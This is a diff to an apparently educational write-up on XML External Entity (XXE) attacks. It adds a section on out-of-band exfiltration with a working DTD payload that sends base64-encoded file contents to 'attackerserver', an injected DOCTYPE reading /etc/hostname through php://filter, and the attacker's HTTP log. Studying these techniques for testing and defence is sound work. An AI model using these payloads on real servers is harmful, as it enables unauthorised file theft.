@@ -301,11 +301,9 @@ Usage of the above definition in the body:
 
    When an entity is defined more than once, the XML parser will assume the first match and drop the remaining.
 
-### Observations
+### Limitations on Data Ex-filtration
 
 XXE File content disclosure has some limitations in type of files that can be disclosed. If a file content contains any of illegal bad characters, the content has a **<u>high likelihood</u>** of not being retrievable. In such cases, the attacker would need to rely on techniques to encode the content before retrieval. The following characters were collected during after some fuzzing.
-
-
 
 **Illegal characters**
 
@@ -373,7 +371,7 @@ We can use an external *readillegal.dtd* file with CDATA wrapper being <u>html-e
 <!ENTITY filecontent "&#x3c;&#x21;&#x5b;&#x43;&#x44;&#x41;&#x54;&#x41;&#x5b; %content; &#x5d;&#x5d;&#x3e;" >
 ```
 
-Injected Definition & body:
+Injected definition & body:
 
 ```xml
 <!DOCTYPE root [
@@ -408,6 +406,42 @@ PHP has a pseudo url "php://" that when invoked by PHP programs, can be abused t
 
 <name> &a; </name>
 ```
+
+**Data Ex-filtration via Out-of-Band XXE (OOBXXE)**
+
+The previous techniques of reading files depends on the immediate response. This type of XXE is known as in-band XXE. Further complications arise when the server does not reflect the content directly in the immediate response. This type of scenario requires Out-of-Band XXE techniques, where the content are sent over to the attacker via other channels such as DNS / HTTP / FTP / etc.
+
+**Stealing all types of files**
+
+With PHP wrappers to encode file contents to base64, we can steal all types of file even when the content is not reflected in the immediate response. It is necessary to use an external DTD file to prevent the internal subset problem mentioned earlier.
+
+oob.dtd:
+
+```dtd
+<!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://attackerserver/dtd.xml?%data;'>">
+%eval;
+```
+
+Injected definition and body;
+
+```xml
+<!DOCTYPE r [
+ <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">
+ <!ENTITY % oob SYSTEM "http://attackerserver/oob.dtd">
+ %oob;
+]> 
+<root> &exfil; </root>
+```
+
+Attacker's HTTP log:
+
+```
+172.21.0.4 - - [13/May/2020 00:00:50] "GET /oob.dtd HTTP/1.0" 200 -
+172.21.0.4 - - [13/May/2020 00:00:50] code 404, message File not found
+172.21.0.4 - - [13/May/2020 00:00:50] "GET /dtd.xml?NDFkZDJlOWZkYjA4Cg== HTTP/1.0" 404 -
+```
+
+The content of `/etc/hostname` ex-filtrated in this case was `41dd2e9fdb08` .
 
 ## Great Works by Others
 
